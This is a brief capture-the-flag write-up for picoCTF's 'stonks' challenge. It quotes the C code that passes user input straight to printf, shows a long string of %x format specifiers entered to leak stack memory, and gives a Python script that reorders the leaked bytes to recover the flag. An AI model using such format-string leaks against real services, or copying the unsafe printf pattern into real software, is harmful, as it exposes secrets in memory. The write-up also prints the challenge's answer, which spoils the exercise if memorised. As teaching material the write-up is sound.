# stonks
Here we need to figure out the API kry of the user, the pyhton code given takes only 2 inputs 1 and 2, to solve this,

```
char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
```
In this code, we can use printf to print the api key in hexadecimal format and then covert it to ascii,

```
What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
84b13d0804b00080489c3f7ec3d80ffffffff184af160f7ed1110f7ec3dc7084b0180184b13b084b13d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3834313634356562ffc8007df7efeaf8f7ed144092962a0010f7d60ce9f7ed20c0f7ec35c0f7ec3000ffc8b718f7d5168df7ec35c08048ecaffc8b7240f7ee5f09804b000f7ec3000f7ec3e20ffc8b758f7eebd50f7ec489092962a00f7ec3000804b000ffc8b7588048c8684af160ffc8b744ffc8b7588048be9f7ec33fc0ffc8b80cffc8b8041184af16092962a00ffc8b77000f7d06fa1f7ec3000f7ec30000f7d06fa11ffc8b804ffc8b80cffc8b79410f7ec3000f7ee670af7efe0000f7ec300000634eef1f52fec90f000180486300f7eebd50f7ee6960804b00018048630080486628048b85
Portfolio as of Tue Nov 14 14:33:57 UTC 2023
```
The %x%x%x format in used within printf() to get unsigned hexadecimal output.
Coverting this to ascii we find our flag inverted 'ocip{FTC0l_I4_t5m_ll0m_y_y3n841645ebÿÐ}'
Now either just invert the code manually or 
to get out original flag we use python

```
# stonks
flag1 = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n841645ebÿÐ }'

# break_up_into_4_character_blocks_as_per_stack_we_can_have_only_32bits
blocks = []
for i in range(0,len(flag1),4):
    s = flag1[i:]
    if len(s) > 4:
        s = s[0:4]
    blocks.append('' .join(s))

# reverse the block and put them together
flag2 = ''
for block in blocks:
    flag2 = flag2 + block[::-1]

print(flag2)
```
Clearly this file breaks the flag into 32bit blocks, and then reverses it to get the original flag
'picoCTF{I_l05t_4ll_my_m0n3y_6148be54}'
